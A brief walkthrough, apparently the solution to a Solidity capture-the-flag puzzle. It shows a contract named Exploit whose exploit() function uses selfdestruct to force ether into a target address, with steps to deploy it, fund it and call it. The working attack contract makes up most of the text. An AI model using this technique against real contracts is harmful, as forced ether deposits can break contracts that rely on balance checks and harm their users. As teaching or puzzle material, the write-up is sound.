Deploy the following contract to the same network
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


contract Exploit {

    receive() external payable{}

    function exploit(address _who) public {
        selfdestruct(payable(_who));
    }
}
```
send some eth to it;

call exploit()
